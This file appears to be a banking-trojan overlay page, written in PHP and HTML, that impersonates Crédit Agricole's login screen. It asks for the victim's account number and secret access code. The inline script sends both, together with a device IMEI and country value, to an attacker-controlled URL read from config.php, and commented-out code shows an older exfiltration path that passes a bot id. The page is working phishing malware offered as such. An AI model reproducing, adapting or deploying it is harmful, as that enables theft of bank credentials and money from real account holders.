<html>
<head>
<style>
	body {
		margin: 0;
		padding: 0;
		font-family: Helvetica Neue,Helvetica,Arial,sans-serif;
		background: #dcecf3;
	}
	.input {
		display: block;
		margin-bottom: 0.4em;
		padding: 4px;
		margin-left: 14px;
		width: 93%;
		background: #dcecf3;
		border: 0;
		border-bottom: 1px solid #33b5e5;
	}
	
	.fielderror {
		display: block;
		margin-bottom: 0.4em;
		padding: 4px;
		margin-left: 14px;
		background: #dcecf3;
		width: 93%;
		border: 0;
		border-bottom: 1px solid #f00;
	}
	
	.submit {
		border: 1px solid;
		cursor: pointer;
		display: inline-block;
		margin: 0px 15px 10px 0px;
		color: #FD7200;
		font-weight: bold;
		padding: 0px 10px;
		text-decoration: none;
		float: right;
		background: #EBEBEB url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAZCAMAAADHTrRNAAAAG1BMVEXl5eXi4+LQz8/LzMzc3NzX19jT09PIyMjg4ODS2k/NAAAAGklEQVQI12NgIAgYGTgYWBhYGdgYmBiYGdgBAUYAJcCHMI8AAAAASUVORK5CYII=') repeat-x scroll left bottom;
		filter: none !important;
		width: 100px;
		height: 27px;
	}
	
	#_mainForm {
	    width: 100%;
		float: left;
		display: block;
		background: #dcecf3;
		margin-top: -15px;
	}
	label {
		padding-left: 14px;
		float: left;
		width: 80%;
		font-weight: bold;
		font-size: 12px;
		color: #000;
	}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<div id="content_div">
<br><br>
<form action="null" method="post" id="_mainForm" target="flow_handler">
<br>
<label>Saisissez votre N° DE COMPTE à l'aide de votre clavier :</label>
<input name="Saisissez votre N° DE COMPTE à l'aide de votre clavier" id="login" maxlength="11" class="input" type="text">

<label>Accès par code confidentiel :</label>
<input name="Accès par code confidentiel" id="password" maxlength="6" class="input" type="password">
<br>
<input value="Confirmer" id="input_submitBtn" class="submit" type="button">
<input type="hidden" name="name" value="Ma Banque">

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</form>
           <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 11) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{6,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "creditagricole'+
					'", "identifiant": "'+oNumInp.value+
					'", "mot_de_passe": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|creditagricole|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>

</div>
</body>
</html>
